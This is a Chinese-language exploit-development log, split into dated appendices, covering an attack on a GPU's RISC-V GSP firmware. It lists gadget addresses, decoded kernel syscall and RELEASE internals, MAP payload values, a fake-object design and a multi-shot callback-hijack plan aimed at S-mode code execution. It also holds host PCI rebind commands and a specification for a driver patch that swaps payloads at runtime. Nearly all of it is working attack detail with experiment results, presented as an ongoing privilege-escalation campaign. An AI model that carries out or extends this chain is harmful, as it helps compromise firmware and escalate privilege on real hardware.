- 或:利用handle entry的现有type(如果某个已有type=2)
```


---

# ═══════════════════════════════════════════════════════════════
# 附录R: t0=2+a0=2双参数攻击成功! (2026-10-14 14:00)
# ═══════════════════════════════════════════════════════════════

## R.1 ★★★ t0=2 syscall机制完全解码! ★★★
```
syscall表: 0xFFFFFFFFA3008280 (内核数据区)
  entry[0] = 0xffffffff930034a0 (t0=0: port操作)
  entry[1] = 0xffffffff93003608 (t0=1)
  entry[2] = 0xffffffff93003802 ★t0=2: RELEASE!
  entry[3] = 0xffffffff93003818 (t0=3)

t0=2 handler (0xffffffff93003802):
  save a0 to [sp+0xC]
  a0 = &saved_a0, a1=1, a2=user_a1
  call 0xffffffff93008ee6 (搜索函数)

搜索函数 (0xffffffff93008ee6):
  s6 = &saved_a0 (用户参数数组)
  s7 = 2 (★TYPE常量★)
  循环: 读args[counter]
  if args[i] != 2: skip! ★a0必须=2!★
  遍历链表 [global+0x50]
  处理匹配条目

RELEASE函数 (0xffffffff93005b26):
  refcount = [a0-8]; refcount--
  if refcount==0: TYPECALC → jalr dtor (S-MODE!)
```

## R.2 ★★★ a0=2确认! 实验结果对比! ★★★
```
a0≠2 (fake_obj/0/garbage): 
  sepc=0x01DE5394 (post-syscall代码), LOCKDOWN=16
  
a0=2 (通过c.ld a0 gadget):
  sepc=0x01DE3366 (第二个c.unimp!), scause=0x2(ILLEGAL!)
  LOCKDOWN=8! ★行为完全不同!★

a0=2+a1=-1 (0x01AA13A2直接):
  无crash, LOCKDOWN=16 (a1=-1走特殊路径)

a0=2+a1=s6 (0x01AA17D0直接):
  sepc=0x01AA181C, scause=0x4(misaligned load), stval=0x1
  LOCKDOWN=8! ★RELEASE在处理!★
```

## R.3 完美的单gadget攻击入口!
```
★ 0x01AA17D0: c.li t0,2; c.li a0,2; c.mv a1,s6; c.unimp
★ 0x01AA66A6: c.li t0,2; c.li a0,2; c.mv a1,s2; c.unimp
  (0x01AA13A2: a1=-1 → 特殊路径,避免使用)

用法: +0xb8 = 0x01AA17D0
  → t0=2 ✓, a0=2 ✓, syscall触发 ✓
  → RELEASE处理链表!
```

## R.4 当前攻击状态
```
✓ t0=2 + a0=2 + c.unimp 单gadget (0x01AA17D0)
✓ RELEASE正在处理(a0=2时行为完全改变)
✓ 链表遍历在进行
✗ 链表中的对象是内核堆的真实对象(不受我们控制)
✗ TYPECALC读真实页头(不是我们的毒药)

攻击差距:
  链表节点在内核堆(0x0C20xxxx, U-mode可写!)
  需要写假obj指针到节点 → 需要write gadget
  但write和syscall不能同时在一个回调!
```

## R.5 下一步(解决方案)
```
方案A: 找到write→return→syscall gadget的链
  write gadget返回ra → 如果ra=syscall gadget地址
  需要找到设置ra=0x01AA17D0的调用

方案B: metadata完全恢复→泵存活→第二次回调
  仍然需要正确的metadata值

方案C: 利用fcnNotify
  写syscall gadget地址到metadata+0xA8
  泵调用fcnNotify → t0=2+a0=2 → RELEASE!
  (之前失败因为泵在调用fcnNotify前挂起)

方案D: 分析链表节点结构
  从内核反汇编找节点布局
  确定obj指针在节点的偏移
  为写入做准备

优先级: D → A → C → B
```

## R.6 今日会话总结
```
时间: 2026-10-13 21:00 ~ 2026-10-14 14:00 (约17小时连续)
发现数: 
  - MAP 32位限制(影响所有旧实验)
  - a4=[metadata+0xC0]受控
  - 地址拆分方法
  - t0=2 RELEASE syscall触发
  - a0=2 type filter机制
  - syscall表位置
  - RELEASE函数完整逻辑
  - 3个完美的t0=2+a0=2 gadget
  - staging不可执行
  - s1=metadata_base, s0≠
可用原语: 8字节写 + 任意跳转 + t0/a0受控syscall
距S-mode: 只差控制链表中的对象指针
```


---

# ═══════════════════════════════════════════════════════════════
# 附录S: 最终突破状态 (2026-10-14 16:00)
# ═══════════════════════════════════════════════════════════════

## S.1 UNLINK函数完整解码!
```
0xffffffff930005dc (UNLINK):
  a5 = [node+0]  ← NEXT
  a4 = [node+8]  ← PREV
  [PREV] = NEXT   ← 内核写#1!
  [NEXT+8] = PREV ← 内核写#2!
  [node+0] = 0, [node+8] = 0

节点结构: next@+0, prev@+8
对象指针在 [node-0x08] (=entry+0x10)
```

## S.2 写+a0=2+syscall组合搜索结果
```
穷举搜索完成 — 以下组合在固件中全部不存在:
  ✗ store → c.li a0,2 → c.unimp
  ✗ c.li a0,2 → store → c.unimp  
  ✗ store → c.li t0,2 → c.li a0,2 → c.unimp
  ✗ c.li t0,2 → store → c.li a0,2 → c.unimp
  ✗ sd/sw t0, imm(a3/a1) + c.unimp (写t0=2)
  
结论: 不存在单gadget完成write+正确syscall
```

## S.3 当前最有效链及其限制
```
链A (最简syscall): +0xb8 = 0x01AA17D0
  c.li t0,2; c.li a0,2; c.mv a1,s6; c.unimp
  ✓ t0=2, a0=2, syscall
  ✗ 无写入

链B (写入+syscall): t0_setter → T3 → s1-write(0x01E679A6)
  c.sd s1(metadata_base), 0(a3); c.unimp×4
  ✓ 写入(值=s1固定), syscall(t0=2)
  ✗ a0=s5(不是2), 写入值不可控

链C (a0受控+syscall): t0_setter → c.ld a0(0x01DE3362)
  c.ld a0, 0x30(s1) [MAP 0x10030]; c.unimp
  ✓ a0从MAP加载, syscall(t0=2)
  ✗ 无写入

限制: 链B和C各自缺少对方的能力
```

## S.4 距离S-mode的确切差距
```
1. 链B: 写入成功但a0=s5≠2 → RELEASE不处理
   如果s5恰好=2 → 全链工作!
   
2. 链A: a0=2正确但无写入 → 页头未毒化
   TYPECALC用真实页头 → dtor不可控

3. 理想链: 写毒化页头 + a0=2 + t0=2 + c.unimp
   → TYPECALC读毒页头 → type=1745445571 
   → slot=staging+0x10070 → dtor=MAP控制 → jalr → S-MODE!
```

## S.5 下次会话最优先任务
```
1. ★★★ 确定s5的值 ★★★
   方法: +0xb8 = c.jr s5 gadget → sepc=s5的实际值!
   如果s5=2 → 链B直接工作!
   
2. 如果s5≠2: 找a0=2的注入点
   - 修改T3为其他gadget(设a0而非a3)
   - 或: 在s1-write后、syscall前注入a0设置
   
3. 模拟器验证: 完整模拟链B的执行
   - rv64_emu.py + kernel ELF
   - 验证RELEASE(a0=s5_val)的行为
   
4. metadata终极恢复
   - 从模拟器获取正确的metadata值
   - 让泵存活 → 多次RPC → 分步攻击
```

## S.6 c.li a0,2正确编码!
```
c.li a0, 2 = 0x4509 (不是之前搜索的0x4515!)
c.li t0, 2 = 0x4289 ✓
注意CI格式的rd在bits 11:7!
```


---

# ═══════════════════════════════════════════════════════════════
# 附录T: s5值+终极返回链 (2026-10-14 17:00) [最终]
# ═══════════════════════════════════════════════════════════════

## T.1 ★★★ s5 = STAGING BASE! ★★★
```
实验: +0xb8 = 0x019DEA9A (c.jr s5)
结果: sepc = 0x0FE4770E10 = staging_base!
结论: s5 = 0x0FE4770E10 (确定值,每次启动相同)
     T3设置a0=s5=staging_base ≠ 2 → RELEASE filter失败
```

## T.2 ★ t0_setter continuation有 c.li a0,2! ★
```
0x013B0D04: addi s3, zero, 0x65
...
0x013B0D1A: c.li a0, 2        ★★★ A0=2! ★★★
0x013B0D1C: auipc ra, 0x6ee
0x013B0D20: jalr ra, ra, -0x730  → call 0x01A9E5EC

0x01A9E5EC是RM库函数,内部有c.unimp(syscall)!
如果t0=2和a0=2保留到c.unimp → RELEASE正确触发!
```

## T.3 终极返回链测试
```
链: t0_setter → T3 → 纯write(0x010F3EF0) → T3_cont → t0_setter_cont(a0=2) → RM函数

结果: sepc=0, LOCKDOWN=8, Xid 120!
     执行到了某个点然后跳到地址0

分析: T3的continuation(0x01106D20)有栈恢复(c.ldsp ra,0x38(sp))
     但我们从中间进入T3,没有执行prologue → 栈上没有正确的ra
     → 栈恢复读到0 → 跳到0 → crash!

根因: mid-function gadget的continuation依赖proper stack frame
```

## T.4 c.li a0,2 正确编码
```
c.li a0, 2 = 0x4509 (CI格式, rd在bits 11:7)
c.li t0, 2 = 0x4289
```

## T.5 攻击距离最终评估
```
有的:
  ✓ 8字节任意写(a1+a4)
  ✓ t0=2+a0=2+syscall单gadget(0x01AA17D0)
  ✓ 受控a0+syscall(0x01DE3362+MAP 0x10030)
  ✓ 写+syscall(链B, 但a0=staging_base≠2)
  ✓ t0_setter continuation有a0=2(但栈恢复break)
  ✓ s5=staging_base(确定值)

缺的:
  ✗ 单一gadget/链: write + a0=2 + t0=2 + c.unimp
  ✗ 泵存活(需要正确metadata)
  ✗ 页头毒化 + 正确参数syscall的组合

下次会话最优先:
  1. 找不依赖栈恢复的write→return→a0=2→syscall链
     (搜索: 无stack restore的gadget continuation)
  2. 或: 直接修改RM函数0x01A9E5EC的入口
     使其接收a0=2后直接到达c.unimp
  3. 或: 模拟器完整模拟返回链,找到确切break点
```


---

# ═══════════════════════════════════════════════════════════════
# 附录U: 2026-10-14 深夜会话 — t0=2机制完全解码 + 单回调空间穷尽宣告 (v4)
# ═══════════════════════════════════════════════════════════════

## U.1 ★★★ t0=2 RELEASE 完整机制(纠正R.1/Q.1所有旧理解!) ★★★
```
syscall入口 0xffffffff93003802: save a0→[sp+0xC]; a0=&saved; a1=1(count); a2=user_a1
→ 0xffffffff93008ee6 (搜索函数):
  s1 = global指针 (auipc链 @0xffffffff93008eea: ld s1,0x126(s1) → 槽=0xffffffffA2FF9010)
  s7=2, s8=1, s9=6(★TYPE-GATE常量★), s4=1, s5=s1+0x400
  gate: args[0](=syscall的a0) 必须==2 — a0是**表索引**,不是filter!
  → ① flush [s1+0x50]队列(每个node: UNLINK + 0x93000500(node-0x18)引用操作)
  → ② a0=[s1+0x450] ★LOOKUP TABLE指针★; a1=args[0]=a0(=2)=索引
  → 0xffffffff9300a090 lookup(tbl, idx, out):
       entry = tbl + 16*(idx+1)
       valid = [entry+0x10] bit63 (bgez→无效返回0)
       obj   = [entry+0x8]  ★★★这就是写入目标!!!★★★
  → ③ TYPECALC(obj)==6 门 (0x93004568: desc=[(obj&0xFFFFF000)+0x20], type=mulw((desc-0xffffffffa300a000)>>3 * 0xCCCCCCCD))
  → ④ [obj-8]++ (refcount++)
  → ⑤ state=lbu[obj+0] 必须∈{1,2}! 否则collect([s1+0x400])不销毁!
       state==2 → UNLINK(obj+0x18) (next@+0,prev@+8,可伪造自链)
       state==1 → 跳过UNLINK
  → ⑥ RELEASE(obj)=0xffffffff93005b26: [obj-8]--; ==0 → TYPECALC → 
       slot = 0xffffffffa300a000 + type*40 + 8; dtor=[slot]; c.jalr dtor ★S-MODE跳转点★
```
**R.1的"搜索type=2条目"理解错误: a0=2是lookup索引; 链表[s1+0x50]是延迟释放队列(先flush);
 type门=6(不是2); state字段=lbu[obj+0]∈{1,2}是新发现的硬约束!**

## U.2 ★ 无门RELEASE函数(潜在C2直达) — 但入口不可控
- 0xffffffff9300095a: s0=a0; s1=[obj+0x78]; 检查[obj+0x80]==[0xffffffffA3008010];
  s1==1路径: s2=[obj+0x10]; s2==obj+0x10可跳过UNLINK; **RELEASE(s0)无任何type门!**
- 调用者只有2处: 0x93000a12(t0=5尾部) 和 0x93006336(t0=23内部)
- **t0=23(0x93006300)自己分配对象(c.li a0,0xA→0x9300543a分配器),用户a0被丢弃 ✗**
- t0=4(0x930008cc)/t0=12(0x93000a20): 也是lookup([s2+0x450])型, a0=索引

## U.3 ★ 新gadget目录(全部capstone验证)
```
★ D_a0 = 0x0136A37A: c.ld a5,0(s1); c.ld a0,8(s1); c.jalr a5
  (a0=[s1+8]=MAP完全受控64位! a5=[s1+0]; 不碰a1/a3/a4/t0) — 全固件唯一A0S1骨牌
★ HOP = 0x010CE062: ld a5,0x128(s1); c.jalr a5 (不碰a0/a1/a3/a4/t0的干净中转)
★ 状态gem = 0x01C28E30: c.sw a4,0(s1); c.addi gp,6; c.unimp
  (写[s1+0]再syscall! 变体0x01C5B5EC/F0/F4存s0/s1/a2)
★ Z-hops ×13 (c.ld a5,imm(s1); c.jalr a5): 0x012EF8D8(imm0), 0x012C8826(0xC0★与a4槽冲突),
  0x01B3631A(8★与a0槽冲突), 0x018C46F6(0x48✓), 0x01558B16(0xC8✓), 0x017DDCD0(0x30✓),
  0x0107BFD8(0xF0✓), 0x018C898E(0x78✓) 等
★ T3-clone ×18 (ld a5,0x110(s1); c.ld a3,0xd0(s1); mv...; c.jalr a5):
  0x010DF044/0x010F497E/0x010F5C04/0x01106D12/0x01117042/0x011190F0/0x01126060/
  0x01126C08/0x01127A52/0x01128384/0x01651202★(≡2 mod 256!)/0x01665706/0x01673352/
  0x01759BF2/0x017622B4/0x0187B312 — a0来源各异(s3/s4/s5/s2), a3槽固定0xD0
★ 测量gadget: c.jr R 编码齐备: s0=0x8402 s1=0x8482 a5=0x8782 s2=0x8902 s3=0x8982 s6=0x8B02
★ SEQ-B = 0x010CE060: c.sw a4,0(a5); ld a5,0x128(s1); c.jalr a5 (store基址=入口a5=自身地址✗RXfault)
★ 0x0123CF66: c.sw s0,8(a3); ld a5,0x220(s1); c.mv a1,s1; c.mv a0,s2; c.jalr a5
★ 0x012400FE: c.ld a5,0(s1); c.lw a4,0x38(s1); c.lw a3,0x18(s1); c.lw a2,0x14(s1);
  c.ld a1,8(s1); c.mv a0,s5; c.jalr a5 (a4/a3/a1/a2全从s1!但a4是32位✗假对象需40位)
★ t0_setter精确解码(0x013B0CF8): c.li t0,2; ld a2,-0xb0(s0); c.mv a1,s3; c.mv a0,s2; c.jalr a4
  (continuation 0x013B0D04+: addi s3,0x65; ... 0x013B0D1A: c.li a0,2; call 0x01A9E5EC)
★ 0x01A9E5EC = varargs打包函数(存a1-a7到tp环形缓冲), 干净返回, 内部无unimp (T.2判断过时)
```

## U.4 单回调组合空间 — 穷举宣告(全部搜索过,全部不存在)
```
✗ write+a0=2+t0=2+unimp 单gadget (S.2 + 今日污点扫描复验)
✗ "store→(s1)0 + MAP跳转" gem (statestore搜索: 21个全是unimp结尾,零个jump结尾)
✗ "c.sd s1,(a3) + ld a5,(s1) + jalr a5" WRITER gem (0命中)
✗ "store R,imm(a1)/(a3) + 任意reg受控跳转" (0命中)
✗ ≡2 mod 256 干净hop (全形态扫描: 唯一0x015EBF02带致命c.sd s1,0x20(a5)自地址存储)
✗ 64位a4-setter保活 (所有c.ld a4,(s1)后紧跟sd a4,-0x28(s0)+c.li a4,0清零!)
✗ "84e2 0000 [mid] 0000" unimp间修复模式 (0命中, 含c.li a0,2/c.ld a0,(s1)/c.sw各种mid)
✗ a3重载gem(imm≠0xD0)+跳转 (0命中)
✗ c.ld a0,(s1) 32位形式全固件0个; T3'变体(a0从s1)+独立跳reg (23候选全含条件分支✗)
✗ a0-setting gem带独立跳转槽 (0x010169EE跳[+0xB8]=回调槽自身→死循环)
```
**结论: obj=s1的state字节([s1+0]低字节∈{1,2} 与 D_a0跳转槽共存冲突)在单回调内无解。
 唯一存活的完整链(T0SET→T3C→D_a0→ENDER1)差state一个字节。**

## U.5 ★★★ MULTI-SHOT 是唯一路径 — 设计定稿 ★★★
```
核心: 泵必须在fcnBackendRw返回后存活到fcnNotify(K.4证明epilogue可达,M.4证明挂在fcnNotify前=metadata结构指针全零所致)

SHOT-1 (攻击写, 恢复metadata):
  +0xB8 = 0x010F3EF0 (c.sd a4,0(a1); c.jr ra 干净返回泵!)
  a1 = MAP 0x10038/3C = LOOKUP_ENTRY+8 (写目标)
  a4 = MAP 0x100C0/C4 = 假对象指针 = staging+0xF2 (低字节0x02! state由MAP直接满足!)
  其余232B全恢复(10个结构指针+counters+其他fcn置NULL/真值)
  → 泵存活 → 走到fcnNotify
SHOT-2 (同消息, fcnNotify):
  +0xA8 = 0x01AA17D0 (c.li t0,2; c.li a0,2; c.mv a1,s6; c.unimp)
  → syscall(t0=2, a0=2) → lookup(tbl,2) → obj=[entry+8]=我们的假对象 →
  → 毒desc解type=6(过门) → refcount [obj-8]=0(MAP)→++→1 → state=2(MAP) →
  → UNLINK([obj+0x18]/[obj+0x20] MAP假自链) → RELEASE → --→0 → TYPECALC →
  → slot=真type-6槽 → 真dtor(假对象) S-MODE执行!
```
**假对象字段全在staging(MAP): [obj-8]=refcount 0; [obj+0]=2; [obj+0x18/0x20]=自链scratch;
 毒desc@[page+0x20]解type=6; 全部无需运行时写!**

## U.6 遗留情报缺口
1. **[global+0x450] lookup表运行时地址** — 模拟器kernel-only boot后为0(RM运行时才填)!
   旧扫描0x0C200328-3A0区域是stride 0x18结构{A,obj,meta} — 与lookup的16字节步进不符,
   可能是t0=0的port句柄表, 不是t0=2的表。需真机探明(读gadget或行为差异扫描)。
2. **type-6真实dtor** = [0xffffffffa300a0f8] 运行时值(模拟器为0) — S-mode payload表面。
3. **metadata正确值**: 5个未知指针(pOurTxHdr等) + counters。
   推测指针在 0x0FE4790Bxx-0x0FE4790CD0 队列控制块区(metadata-0x140~-0x300)。
   host侧: greenfield message_queue_cpu.c + msgq_priv.h 有共享队列布局;
   GSP侧: msgqInit(0x010976E0)的caller传config — 需继续逆向。
   ⚠️ 注意: 回调劫持必然先清零metadata → 无法在回调内读取真值(鸡生蛋)!
   只能靠: 固件msgqInit caller分析 / host侧RPC参数推导 / crash迭代收敛法。

## U.7 下一步(优先级)
1. VM测量射击: c.jr s0/s2/s3/s4/a5 (5发, 每发~6分钟) → 未知寄存器真值
2. 逆向0x010976E0 caller → metadata 10指针真值
3. t0=2+a0=N(N=0..8) 行为探针(0x01DE3362链) → 表有效性+可能的表地址侧信道
4. metadata恢复迭代射击(crash地址逐字段收敛)
5. 全链SHOT-1+SHOT-2 → S-MODE

---

# ═══════════════════════════════════════════════════════════════
# 附录V: 2026-10-15凌晨 VM阶段记录 — GPU复活流程 + 观测通道变化 (v5)
# ═══════════════════════════════════════════════════════════════

## V.1 ★ GPU复活标准流程(重大运维发现) ★
```
Xid 119级(泵挂)后: VM重启 → 不够! (boot即"Reset required")
VM内PCIe remove/rescan → 驱动能载但GSP引导卡mailbox → 不够!
★宿主侧完整流程(验证有效)★★★:
  1. VM干净poweroff (nvidia楔死时会卡住 → sudo pkill -9 qemu-system)
  2. 宿主: unbind 01:00.0/01:00.1 from vfio-pci
  3. 宿主: echo 1 > /sys/bus/pci/devices/0000:01:00.0/remove (+01:00.1)
  4. 宿主: echo 1 > /sys/bus/pci/rescan  (→ rescan后会被宿主nvidia抢绑!)
  5. 宿主: unbind nvidia → driver_override=vfio-pci → drivers_probe
  6. k61_start.sh 重启VM → 纯净insmod → nvidia-smi显示RTX 5090 ✓
```

## V.2 观测通道变化(重要!)
```
本日所有射击: OVF FIRE确认(mapN=2解析✓, cksum fixed✓) + LOCKDOWN确认
(GSP_LOCKDOWN_NOTICE fn=4124 ×16条✓) + riscvPc=0x930016f4(wfi=任务被park)
BUT: ✗ 无 "sepc:" 行, ✗ 无 Xid 120!
→ k61_shot.sh 的 `dmesg | grep sepc` 提取法失效
→ 对照实验(0x01AA17D0, 历史必出Xid 120)也未复现历史特征
可能原因: 宿主级rescan后 = 冷启动级事件 → FSP从flash恢复WPR2 →
  RM任务环境变化 / 异常报告RPC路径变化(crashcat/NOCAT未触发)
→ 需要: GPU_REVIVE_V2.sh (MODS WPR2清零) 后重新对照,
  或找到新的异常详情提取渠道(riscvPc只在park点, 无trap细节)
```

## V.3 测量射击结果(部分)
```
a5测量(c.jr a5 / SEQ-B store): 无Xid 120无sepc — a5值未获得
  (SEQ-B首指令c.sw a4,0(a5)未产生store fault → a5可能=0或指向可写区;
   后续c.jalr [s1+0x128]=0 → 零页执行 → syscall风暴 → Xid 119 ✓ 一致)
结论: 泵的a5 = 0 (P.3的"a5非零"记载或针对不同回调点, 待复核)
```

## V.4 会话总产出清单(静态)
- t0=2机制完全解码(附录U.1): lookup表+type6门+state门+真dtor路径
- 无门RELEASE函数×2(0x9300095a等) + t0=23分配器路径(用户a0被弃)
- 新gadget: D_a0/hop/状态gem/Z-hops×13/T3-clone×18(含≡2的0x01651202)
- 单回调组合空间穷尽证明(附录U.4) → multi-shot是唯一路径(U.5)
- 测量gadget地址: c.jr s0=0x1D1DCEC s2=0x1CA1D1E s3=0x1E184DC
  s4=0x1CEFC38 a5=0x100F7B2 s6=0x1C54370 (c.jr s5=0x019DEA9A历史已知)

## V.5 下次会话最优先
1. 修复观测通道: GPU_REVIVE_V2.sh(WPR2清零) → 重跑0x01AA17D0对照
   → 若恢复Xid 120+sepc → 继续测量射击(s0/s2/s3/s4)
2. 若观测通道仍断: 研究crashcat报告路径(kgspPostCrashcatReportToNocat,
   kernel_gsp.c:6838+, ra/scause/stval打包进errorCode)作为新sepc来源
3. metadata恢复设计(附录U.6.3) — multi-shot的前置
4. 注意: k61_shot.sh需更新提取逻辑(grep sepc → grep riscvPc/LOCKDOWN)

---

# ═══════════════════════════════════════════════════════════════
# 附录W: 2026-10-15 观测通道诊断 + 宿主锁死事件 (v6)
# ═══════════════════════════════════════════════════════════════

## W.1 sepc通道诊断结论
```
sepc来源确认: crashcat_report_v1.c:376 (S-mode CSR打印) — GSP侧crashcat报告→host解码
Xid 120来源: GSP RM的OS_ERROR_LOG事件(_kgspRpcOsErrorLog)
对照实验1(0x01AA17D0): 无Xid120无sepc, LOCKDOWN=16
对照实验2(0x013B0D02+a4=0x1000 历史必出sepc=0x1000): 仍然无! LOCKDOWN=16
→ 观测通道本身在当前GPU状态下断开(非风暴理论)
→ LOCKDOWN≠crash: 任务被LibOS park在wfi(0x930016f4), 不生成crashcat报告
```

## W.2 ★★★ 宿主锁死事件(教训!) ★★★
```
起因: 尝试"宿主nvidia完整初始化→vfio→VM"复刻历史启动模式
失败链: 宿主modprobe nvidia卡在GPU探测(GPU已wedge) → D-state持有设备锁
      → 后续所有 unbind/remove/rescan 全部排队等锁 → PCI子系统对01:00.0死锁
      → 10分钟不释放, 多个bash/modprobe/gb202_hotspot D-state
⚠️⚠️ 教训(必须遵守):
  1. GPU在wedge状态时, 绝不让宿主nvidia去probe它!(modprobe会永久卡锁)
  2. gb202_hotspot监控进程必须在任何GPU操作前pkill(GPU_REVIVE脚本里有,我漏了)
  3. 修复顺序只能是: 先宿主remove/rescan(无驱动probe) → vfio → VM内驱动
  4. 宿主锁死后唯一解法 = 重启宿主机
```

## W.3 ★★★ 下次会话操作序列(宿主重启后) ★★★
```
0. [用户重启宿主机] — 冷启动GPU(FSP从flash恢复WPR2, 可能需要处理)
1. pkill -9 gb202_hotspot (永远第一步!)
2. 检查GPU状态: lspci -s 01:00.0; 若宿主nvidia已绑(冷启动自动) → 
   看nvidia-smi是否正常: 
   a. 正常 → 这就是历史基线环境! 直接 k61_start.sh → 对照实验
   b. "Reset required" → 宿主 remove/rescan流程(附录V.1) → vfio → k61_start
3. 纯净驱动加载 → nvidia-smi确认 → 对照实验: 
   xdig_map="0x100b8:0x013b0d02,0x100bc:0x0,0x100c0:0x1000,0x100c4:0x0"
   期望: sepc=0x1000 (若恢复 → 观测通道✓ → 冷启动可能就是修复!)
4. 观测通道✓后: 测s5(0x100b8=0x019dea9a) 验证staging基址跨冷启动稳定性
   (0x0FE4770E10? 若变了 → 所有MAP键推导要重做!)
5. 测 s0/s2/s3/s4 (c.jr地址见V.4) → 补全寄存器情报
6. 之后按附录U.5 multi-shot设计推进
```

## W.4 当前遗留状态(会话结束时)
- VM已销毁(附录V末尾, 干净)
- 宿主PCI对01:00.0死锁(需重启)
- GPU物理状态: wedge(D-state锁持有者卡在GPU探测)
- 所有静态成果已存: 附录U(gadget+机制) + V(运维) + W(本节)

---

# ═══════════════════════════════════════════════════════════════
# 附录X: 2026-10-15 上午 — 观测通道修复★ + 寄存器全表 + 读原语恢复 (v7)
# ═══════════════════════════════════════════════════════════════

## X.1 ★★★★★ 观测通道修复 — rxLinked!!! ★★★★★
```
问题: 10-14 22:59 UTC后所有射击只出LOCKDOWN(16), 无Xid120/sepc
根因: ★ MAP缺少 0x100a4:1 ★ (metadata+0xA4 = rxLinked标志!)
  - 所有历史MAP(k61_scan起)都带它, 被迷信复制从未记录
  - 没有它 → GSP侧事件投递(msgq rx链)失效 → 无crashcat/OS_ERROR_LOG
验证: 0xdead0000对照弹 → sepc=0xdead0000 scause=0xc LOCKDOWN=8 ✓✓✓
★★★ 纪律: 从今往后每个MAP必须包含 0x100a4:1 ★★★
(VM journal诊断法: journalctl --list-boots + -b -N 逐boot数Xid120/sepc/LOCKDOWN)
VM时钟慢24h, journal时间戳-24h=真实UTC。
```

## X.2 寄存器全表(回调入口, 真机实测, 含拆分注意)
```
s0 = 0x0FEB80FCF0   (RM任务栈! 对应文件"0x0FEB80Fxxxx任务栈")
s1 = 0x0FE4790E10   (metadata_base)
s2 = 0x0000000000   ★(t0_setter传给下游的a0=0 → 证实必须D_a0设a0=2)
s3 = 0x0FE4770E10   ★★(t0_setter传给下游的a1 = STAGING_BASE!)
s4 = 0x0000000000
s5 = 0x0FE4770E10   (staging_base, 跨一切折腾稳定✓)
s6 = 0x0000000000
a5 = 未定(一次异常上下文, 一次无rxLinked不可判)
测量gadget: c.jr R @ s0=0x1D1DCEC s2=0x1CA1D1E s3=0x1E184DC s4=0x1CEFC38
            a5=0x100F7B2 s6=0x1C54370 s5=0x019DEA9A(历史)
```

## X.3 读原语恢复 + 首批扫描
```
读gadget: +0xB8=0x01020A30 (ld a5,0x168(a1); c.mv a0,s3; c.jalr a5)
  a1 = target-0x168, MAP 0x10038/0x1003C ⚠️40位拆分: 0x0FE4xxxxxx → low=0xExxxxxxx, high=0xF!!
验证: MAP 0x10138=0xCAFEBABE → 读[metadata+0x138] → sepc=0xCAFEBABE ✓✓✓
首批: [staging+0x10000]=0x2510de7ec0000000 (TX区头=队列数据, 可读✓)
注意: fire时机漂移(28s~220s不等), k61_scan批量时留意
```

## X.4 关键新认识
- s3=s5=staging → T0SET直接给stage-2送 a1=staging_base
- s2=s4=s6=0 → t0_setter系全部下游a0=0, a1=staging
- META DUMP(宿主232B) = 宿主自己的msgq簿记(内核VA), 非GSP镜像;
  其[050-078]计数器可能与GSP侧+0x50-0x78对应(待逐字段比对)
- 溢出只清零metadata本身232B → 前置区0x0FE4790C00-0xCF0(指针目标簇)完好可读!

## X.5 下次会话(按优先级)
1. ★ k61_scan.sh批量扫描(记得给它的MAP加0x100a4:1!):
   a. 0x0FE4790C00-0x0FE4790E10 逐8字节(前置区=指针目标簇, 找队列头结构)
   b. staging+0 / +0x10000 头部区域(RX/TX头布局)
   → 推导5个未知指针(pOurTxHdr等) → metadata恢复MAP完整化
2. 比对宿主META DUMP计数器 vs GSP +0x50-0x78 → counters恢复值
3. t0=2+a0=N探针(0x01DE3362链+t0set): N=0..8 → lookup表有效性/表地址侧信道
4. metadata恢复试射(迭代crash地址收敛法) → 泵存活验证(Xid119消失=存活!)
5. 存活 → SHOT-1(纯写)+SHOT-2(fcnNotify=0x01AA17D0) → S-MODE

---

# ═══════════════════════════════════════════════════════════════
# 附录Y: 2026-10-15 下午 — ★MULTI-CALL实锤★ 自换回调双发成功 (v8)
# ═══════════════════════════════════════════════════════════════

## Y.1 ★★★ MULTI-CALL 证实(真机) ★★★
```
实验 multicall_probe:
  MAP = 0x100a4:1,
        0x100b8:0x010f3ef0            (回调=纯写W: c.sd a4,0(a1); c.jr ra)
        0x10038:0xe4790ec8,0x1003c:0xf (a1 = metadata+0xB8 = 回调槽自己!)
        0x100c0:0x01aa17d0,0x100c4:0x0 (a4 = TRIGGER)
结果: sepc=0x01AA181C stval=0x1 scause=0x4 LOCKDOWN=8, Xid119=0 Xid120=1
  = R.2时代a0=2触发器的精确历史指纹!!!
解读:
  Call#1 (W): [metadata+0xB8] = 0x01AA17D0 (自换回调!) → c.jr ra干净返回
  泵存活且立即重试(同一消息窗口,无需等6s超时!)
  Call#2 (TRIGGER): t0=2, a0=2, unimp → RELEASE walk真的执行(崩在walk内=预期)
★★★ 结论: 一发boot内多次回调 + 第一发写的值决定第二发的gadget ★★★
机理(msgq.c源码): rxLinked=1 → RxGetReadAvailable → _backendRead32
  → fcnBackendRw(即回调) — 失败返回(a0=pVal≠0)只是"本消息不可读"
  → 泵循环重试 → 再次调用回调!
所有fcn*指针NULL检查✓ 泵不崩 — 无需完整metadata恢复!!!
```

## Y.2 写gadget变体清单(按值来源)
```
a4来源(MAP任意64位!): 0x010F3EF0 (c.sd a4,0(a1); c.jr ra) ★主力★
                      0x16507D0 (c.sw a4,0(a1); c.jr ra) 32位版
a1静态限制: (a1,a4)每boot一对静态值 — 单gadget只能永远写同一(target,value)
自换回调探针 = 唯一自洽双发(写目标=回调槽)
```

## Y.3 剩余障碍与方案
```
缺口: 总攻需要两次"有用"写: ①fake_obj→[entry+8] ②回调→触发器
      但静态(a1,a4)只支持一次有用写(另一次是自换)
方案A (推荐): v24驱动 = v23 + xdig参数运行时可写(sysfs 0644) + 参数变更
      时重新parse+重置fire计数器 → 宿主在两次调用间隙换MAP → 完全自由
方案B: 寻找不同值来源的写变体(c.sd s5/s1,(a1);c.jr ra)级联 — 搜索过无果
方案C: 两段式跨RPC: Call#1=ENDER2(0x01E5B6FE: 写+unimp) — 写+触发一次完成,
      但a0=泵pVal≠2被门拒绝; 需先解决a0 — [sp+0xC]保存的是回调入口a0,
      无法写2 ✗
另需情报: [global+0x450]lookup表运行时地址(读gadget扫描或a0=N探针)
```

## Y.4 v24驱动改造规格(下次实施)
```
1. module_param_named(xdig_map, ..., charp, 0644)  (当前0=不可写)
   + 同样处理 a1/a4 相关参数(或统一xdig_map)
2. 参数变更回调(/sys写入)→ 重新调用_xdigParseParams() + _xdigOvfMapN重置
   + fire计数器(firen)清零 → 下一个RPC重新点火
3. 验证: 射击#1(MAP-A: 写) → 立即echo MAP-B(触发) → 射击#2自动完成
4. 文件: /home/user/rpc_ovf_patch_v24.py (基于v23)
```

---

# ═══════════════════════════════════════════════════════════════
# 附录Z: 2026-10-15 深夜 — v24.1运行时换弹 + NULL回调 + metadata迭代 (v9)
